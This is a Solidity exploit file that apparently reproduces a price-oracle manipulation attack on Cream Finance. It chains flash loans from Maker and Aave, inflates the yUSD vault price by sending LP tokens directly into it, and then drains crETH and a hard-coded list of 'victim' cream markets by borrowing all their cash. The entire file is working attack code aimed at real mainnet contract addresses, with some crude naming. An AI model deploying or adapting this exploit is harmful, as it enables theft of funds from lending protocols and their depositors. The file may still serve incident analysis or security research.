pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function approve(address guy, uint256 wad) external returns(bool);
}

interface IUNIV3Router {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params)
        external
        payable
    returns (uint256 amountIn);
}
interface IERC3156FlashBorrower {

    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}


interface IERC3156FlashLender {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IYDAI {
    function deposit(uint256 _amount) external;

    function withdraw(uint256) external;
}

interface IYUSD {
    function totalAssets() external returns(uint256);

    function deposit(uint256 amount, address recipient) external returns(uint256);

    function withdraw() external returns(uint256);

    function transfer(address dst, uint256 amount) external returns (bool);
}

interface IYPool {
    function add_liquidity(uint256[4] memory amounts, uint256 min_mint_amount) external;

    function remove_liquidity_imbalance(uint256[4] memory amounts, uint256 min_burn_amount) external;
}

interface ICrErc20 {
    function mint(uint mintAmount) external returns (uint);

    function getCash() external view returns (uint);

    function borrow(uint borrowAmount) external returns (uint);
}

interface ICrETH {
    function mint() external payable;

    function borrow(uint borrowAmount) external returns (uint);

    function getCash() external view returns (uint);

    function transfer(address dst, uint256 amount) external returns (bool);
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint[] memory);

    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICurvePool {
    function exchange_underlying(int128, int128, uint256, uint256) external returns(uint256);
}

interface IYVaultPeak {
    function redeemInYusd(uint256, uint256) external;
}

address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant CrYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
address constant Unitroller = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
address constant YUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
address constant CrETH = 0xD06527D5e56A3495252A528C4987003b712860eE;
address constant AAVE_LENDINGPOOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

interface ILuck {
    function luck2(uint256) external;
}

contract LuckPartner {

    address private luck;
    address private constant aWETH = 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e;

    constructor() {
        luck = msg.sender;
        IERC20(WETH).approve(aWETH, type(uint256).max);
    }

    function fuck() external {
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 524102159298234706604104;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        // require(allowance[src][msg.sender] >= wad); => src = this; msg.sender = lendingPool
        IERC20(WETH).approve(AAVE_LENDINGPOOL, type(uint256).max);
        ILendingPool(AAVE_LENDINGPOOL).flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
        // console.log("finish flashloan from aave");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
  ) external returns (bool) {
        
        IWETH(WETH).withdraw(amounts[0] * 99 / 100);
        IERC20(WETH).transfer(luck, IERC20(WETH).balanceOf(address(this)));
        // console.log("account balance: %d eth", address(this).balance);

        ICrETH(CrETH).mint{value: address(this).balance}();
        address[] memory ctokens = new address[](1);
        ctokens[0] = CrETH;
        IComptroller(Unitroller).enterMarkets(ctokens);
        
        // console.log("yusd balance of cryusd: %d", IERC20(YUSD).balanceOf(CrYUSD));
        uint256 borrow_amount = IERC20(YUSD).balanceOf(CrYUSD);
        ICrErc20(CrYUSD).borrow(borrow_amount);
        
        (, uint256 account_liquidity, ) = IComptroller(Unitroller).getAccountLiquidity(address(this));
        // console.log("account liquidity %d", account_liquidity);
        
        // Key!!! decrease yusd totalSupply????
        IERC20(YUSD).approve(CrYUSD, type(uint256).max);
        ICrErc20(CrYUSD).mint(borrow_amount);
        IERC20(CrYUSD).transfer(luck, IERC20(CrYUSD).balanceOf(address(this)));
        ICrErc20(CrYUSD).borrow(borrow_amount);
        ICrErc20(CrYUSD).mint(borrow_amount);
        IERC20(CrYUSD).transfer(luck, IERC20(CrYUSD).balanceOf(address(this)));
        ICrErc20(CrYUSD).borrow(borrow_amount);

        // console.log("borrow amount: %d", borrow_amount);
        IYUSD(YUSD).transfer(luck, borrow_amount);
        ILuck(luck).luck2(amounts[0] + premiums[0]);
        // console.log("aave: flashloan amount %d fee %d", amounts[0], premiums[0]);
        // console.log("weth amount: %d, eth amount: %d", IERC20(WETH).balanceOf(address(this)), address(this).balance);
        // console.log("enough money", amounts[0] + premiums[0] == IERC20(WETH).balanceOf(address(this)));
        // console.log("allowance: %d", IERC20(WETH).allowance(address(this), aWETH));
        return true;
  }

    receive() external payable {}
}   


contract Luck {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address private constant DUSD = 0x5BC25f649fc4e26069dDF4cF4010F9f706c23831;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DSSFLASH = 0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853;
    address private constant YDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address private constant YUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address private constant YUSDT = 0x83f798e925BcD4017Eb265844FDDAbb448f1707D;
    address private constant YTSDU = 0x73a052500105205d34Daf004eAb301916DA8190f;
    
    address private constant YPOOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address private constant YPOOL_LP = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    address private constant UNIV3_Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant Curve_Pool = 0x8038C01A0390a8c547446a0b2c18fc9aEFEcc10c;
    address private constant YVaultPeakProxy = 0xA89BD606d5DadDa60242E8DEDeebC95c41aD8986;
    uint256 private constant FIVE_HUNDRED_MILLION = 500_000_000e18;
    constructor() {
        IERC20(DAI).approve(DSSFLASH, type(uint256).max);
    }

    function luck() external {
        IERC3156FlashLender(DSSFLASH).flashLoan(IERC3156FlashBorrower(address(this)), DAI, FIVE_HUNDRED_MILLION, new bytes(0));
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        // -------------- Chapter 1: Set a trap for Cream.finance ------------ 
        // Step 1-1: deposit DAI to obtain yDAI
        IERC20(DAI).approve(YDAI, type(uint256).max);
        IYDAI(YDAI).deposit(_amount);
        
        // Step 1-2: add liquidity in ypool to obtain lp
        IERC20(YDAI).approve(YPOOL, type(uint256).max);
        IERC20(YUSDC).approve(YPOOL, type(uint256).max);
        IERC20(YUSDT).approve(YPOOL, type(uint256).max);
        IERC20(YTSDU).approve(YPOOL, type(uint256).max);
        IYPool(YPOOL).add_liquidity([IERC20(YDAI).balanceOf(address(this)), 0,  0, 0], 0);
        // step 1-3: obtain yusd by depositing lp to yusd 
        IERC20(YPOOL_LP).approve(YUSD, type(uint256).max);
        uint yusd_amt = IYUSD(YUSD).deposit(IERC20(YPOOL_LP).balanceOf(address(this)), address(this));
        // step 1-4: Loan using yUSD as collateral in Cream.finance 
        // NOTE: if we can manipulate the price of yUSD then, we will borrow more!
        IERC20(YUSD).approve(CrYUSD, type(uint256).max);
        ICrErc20(CrYUSD).mint(yusd_amt);
        address[] memory ctokens = new address[](1);
        ctokens[0] = CrYUSD;
        IComptroller(Unitroller).enterMarkets(ctokens);

        // ------------- Chapter 2: with the help of "partner",  forcing cream.fince fall trap -------------------------------
        LuckPartner partner = new LuckPartner();
        partner.fuck();



        // FUCK: BurnFrom need allownance[this][YPOOL]
        uint256 bal_lp = IERC20(YPOOL_LP).balanceOf(address(this));
        // Still not figure out how Cruve work
        // console.log("bal_lp %d", bal_lp);
        IYPool(YPOOL).remove_liquidity_imbalance([bal_lp * 1008 / 1000, 0, 0, 0], bal_lp);
        // console.log("ydai withdraw %d", IERC20(YDAI).balanceOf(address(this)));
        IYDAI(YDAI).withdraw(IERC20(YDAI).balanceOf(address(this)));
        // console.log("dai balance: %d", IERC20(DAI).balanceOf(address(this)));

        IUNIV3Router.ExactOutputSingleParams memory params = IUNIV3Router.ExactOutputSingleParams({
            tokenIn: USDC,
            tokenOut: DAI,
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 120,
            amountOut: FIVE_HUNDRED_MILLION - IERC20(DAI).balanceOf(address(this)),
            amountInMaximum: 6451882924726, 
            sqrtPriceLimitX96: 0
        });
        // console.log("usdc amount %d", IERC20(USDC).balanceOf(address(this)));
        IERC20(USDC).approve(UNIV3_Router, type(uint256).max);
        IUNIV3Router(UNIV3_Router).exactOutputSingle(params);  

        IWETH(WETH).withdraw(IERC20(WETH).balanceOf(address(this)));

        return CALLBACK_SUCCESS;
    }


    address[] private victim_crtokens = [0xfd609a03B393F1A1cFcAcEdaBf068CAD09a924E2,
                                        0x228619CCa194Fbe3Ebeb2f835eC1eA5080DaFbb2,
                                        0xeFF039C3c1D668f408d09dD7B63008622a77532C,
                                        0x299e254A8a165bBeB76D9D69305013329Eea3a3B,
                                        0x8379BAA817c5c5aB929b03ee8E3c48e45018Ae41,
                                        0x2A537Fa9FFaea8C1A41D3C2B68a9cb791529366D,
                                        0xe89a6D0509faF730BD707bf868d9A2A744a363C7,
                                        0x44fbeBd2F576670a6C33f6Fc0B00aA8c5753b322,
                                        0x8C3B7a4320ba70f8239F83770c4015B5bc4e6F91,
                                        0x797AAB1ce7c01eB727ab980762bA88e7133d2157,
                                        0x1F9b4756B008106C806c7E64322d7eD3B72cB284,
                                        0x523EFFC8bFEfC2948211A05A905F761CBA5E8e9E,
                                        0x10FDBD1e48eE2fD9336a482D746138AE19e649Db,
                                        0x4112a717edD051F77d834A6703a1eF5e3d73387F
                                    ];

    function luck2(uint256 _repay_amount) external {
        IUNIV3Router.ExactOutputSingleParams memory params = IUNIV3Router.ExactOutputSingleParams({
            tokenIn: WETH,
            tokenOut: USDC,
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp + 120,
            amountOut: 7453002766252,
            amountInMaximum: 5000000000000000000000, 
            sqrtPriceLimitX96: 0
        });
        IERC20(WETH).approve(UNIV3_Router, type(uint256).max);
        IUNIV3Router(UNIV3_Router).exactOutputSingle(params);

        IERC20(USDC).approve(Curve_Pool, type(uint256).max);
        uint256 dusd_amount = ICurvePool(Curve_Pool).exchange_underlying(2, 0, IERC20(USDC).balanceOf(address(this)) / 2, 0);
        IYVaultPeak(YVaultPeakProxy).redeemInYusd(dusd_amount, 0);
        uint withdraw_amount = IYUSD(YUSD).withdraw();
        uint yusd_total = IYUSD(YUSD).totalAssets();
        IERC20(YPOOL_LP).transfer(YUSD, yusd_total);


        ICrETH(CrETH).borrow(ICrETH(CrETH).getCash());
        IWETH(WETH).deposit{value: address(this).balance}();
        IERC20(WETH).transfer(msg.sender, _repay_amount);

        for(uint i = 0; i < victim_crtokens.length; i++) {
            ICrErc20 t = ICrErc20(victim_crtokens[i]);
            
            t.borrow(t.getCash());
        }
    }

    receive() external payable {}
}